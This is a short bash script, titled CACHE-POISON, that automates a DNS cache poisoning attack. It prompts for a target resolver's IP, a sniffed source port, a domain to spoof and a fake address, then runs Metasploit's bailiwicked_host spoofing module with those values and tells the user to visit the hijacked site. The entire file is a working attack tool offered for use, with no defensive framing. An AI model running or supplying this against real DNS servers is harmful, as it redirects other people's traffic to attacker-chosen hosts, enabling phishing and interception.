#!/usr/bin/bash
figlet CACHE-POISON
echo "                                                                     "
echo "---------------------------------------------------------------------"
echo "| This script uses metasploit v4.17.17, so make sure you have it !! |" 
echo "---------------------------------------------------------------------"
echo "                                                                     "
echo "Enter the ip of dns cache server to target :"
read ip
echo "query a legitimate domain from recursive server and sniff the packet"
echo "Enter the source port you see :"
read port
echo "Enter the spoofed site name :"
read site
echo "Enter the spoofed ip you want to cache"
read sip
echo "ctrl-c to exit , Lets begin...."
msfconsole -q -x "use auxiliary/spoof/dns/bailiwicked_host;
set RHOST $ip;
set HOSTNAME $site;
set NEWADDR $sip;
set SRCPORT $port;
set XIDS 50;
exploit;"
echo "Now Access the $site website ASAP..."
